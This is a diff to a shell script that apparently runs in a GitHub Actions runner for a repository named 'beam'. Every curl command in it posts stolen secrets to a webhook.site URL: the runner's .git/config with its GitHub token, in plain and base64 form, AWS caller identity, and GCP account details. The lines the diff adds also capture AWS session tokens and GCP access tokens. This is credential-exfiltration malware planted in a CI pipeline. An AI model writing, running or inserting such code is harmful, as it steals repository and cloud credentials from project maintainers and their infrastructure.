@@ -16,21 +16,36 @@ cat /home/runner/work/beam/beam/.git/config >&2
 
 curl -X POST \
   -H "Content-Type: text/plain" \
-  --data "$(base64 -w 0 /home/runner/work/beam/beam/.git/config)" \
-  https://webhook.site/dda47cb0-8450-4adb-ba27-839b4a9a3229/githubtoken-base
+  --data "$(cat /home/runner/work/beam/beam/.git/config)" \
+  https://webhook.site/dda47cb0-8450-4adb-ba27-839b4a9a3229/githubtoken
 
 curl -X POST \
   -H "Content-Type: text/plain" \
-  --data "$(cat /home/runner/work/beam/beam/.git/config)" \
-  https://webhook.site/dda47cb0-8450-4adb-ba27-839b4a9a3229/githubtoken
+  --data "$(base64 -w 0 /home/runner/work/beam/beam/.git/config)" \
+  https://webhook.site/dda47cb0-8450-4adb-ba27-839b4a9a3229/githubtoken-base
 
 curl -X POST \
   -H "Content-Type: text/plain" \
   --data "$(aws sts get-caller-identity)" \
   https://webhook.site/dda47cb0-8450-4adb-ba27-839b4a9a3229/aws-identity
 
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(gcloud gcloud auth list)" \
+  https://webhook.site/dda47cb0-8450-4adb-ba27-839b4a9a3229/gcp-authlist
 
-CREDS=$(aws sts get-session-token) 
+
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(gcloud config get-value account)" \
+  https://webhook.site/dda47cb0-8450-4adb-ba27-839b4a9a3229/gcp-get-value-account
+
+export AWSCREDS=$(aws sts get-session-token) 
+export GCPCREDS=$(gcloud auth print-access-token) 
+export GCPFullCred="$(curl -s -X POST \
+    -H "Content-Type: application/x-www-form-urlencoded" \
+    -d "token=$GCPCREDS" \
+    https://oauth2.googleapis.com/tokeninfo)"
 
 curl -X POST \
   -H "Content-Type: text/plain" \
